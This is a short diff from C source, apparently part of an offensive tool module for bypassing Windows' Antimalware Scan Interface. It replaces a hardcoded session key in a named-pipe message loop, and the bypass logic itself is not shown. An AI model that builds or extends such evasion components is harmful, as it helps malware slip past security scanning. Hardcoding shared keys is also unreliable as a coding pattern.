@@ -50,7 +50,7 @@ DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "LdRrpJFuq4uq1smR";
+    BYTE SharedSessionKey[] = "YiZZCxy3SLMsIdhN";
 
     while (TRUE) {
         IPC_MESSAGE inMsg = { 0 };
